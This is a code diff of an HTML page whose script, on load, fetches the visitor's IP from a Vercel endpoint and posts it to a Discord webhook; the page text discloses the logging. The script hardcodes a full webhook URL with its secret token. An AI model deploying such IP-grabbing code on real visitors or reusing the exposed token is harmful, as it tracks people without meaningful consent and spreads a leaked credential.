@@ -10,20 +10,71 @@
     <p>Your IP address will be logged and sent to a Discord webhook.</p>
 
     <script>
-        // Call your Vercel API when the page loads
-        fetch('https://gyattt-git-main-koshiros-projects-80a46bab.vercel.app/', {
-            method: 'GET',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('IP logged:', data);
-        })
-        .catch(error => {
-            console.error('Error logging IP:', error);
-        });
+        // Define the Vercel API endpoint
+        const vercelApiUrl = 'https://gyattt-git-main-koshiros-projects-80a46bab.vercel.app/';
+
+        // Define the Discord webhook URL
+        const discordWebhookUrl = ' https://discord.com/api/webhooks/1306285452394889226/N79NNR4O9o-_JAO133sHZ1ltgs-JAXgIGGMv6ucBlA-JhyTPzL4JkDSd7VZciPhHerdC'; // Replace with your actual Discord webhook URL
+
+        // Function to log the IP and send it to Discord
+        async function logAndSendIp() {
+            try {
+                // Call the Vercel API to get the user's IP
+                const response = await fetch(vercelApiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                });
+
+                // Check if the response is ok (status code 200-299)
+                if (!response.ok) {
+                    throw new Error('Failed to fetch IP address from API');
+                }
+
+                // Parse the response as JSON
+                const data = await response.json();
+                const userIp = data.ip; // Assuming the API returns an object like { "ip": "123.45.67.89" }
+
+                console.log('IP logged:', userIp); // Log the IP address to the console for debugging
+
+                // Send the logged IP to the Discord webhook
+                await sendToDiscord(userIp);
+
+            } catch (error) {
+                console.error('Error logging IP:', error);
+            }
+        }
+
+        // Function to send the IP address to Discord via webhook
+        async function sendToDiscord(ip) {
+            try {
+                const payload = {
+                    content: `Logged IP address: ${ip}`, // Customize the message format as needed
+                };
+
+                // Send the payload to the Discord webhook
+                const response = await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                // Check if the request was successful
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Discord');
+                }
+
+                console.log('Successfully sent to Discord:', ip);
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // Call the function when the page loads
+        logAndSendIp();
     </script>
 </body>
 </html>
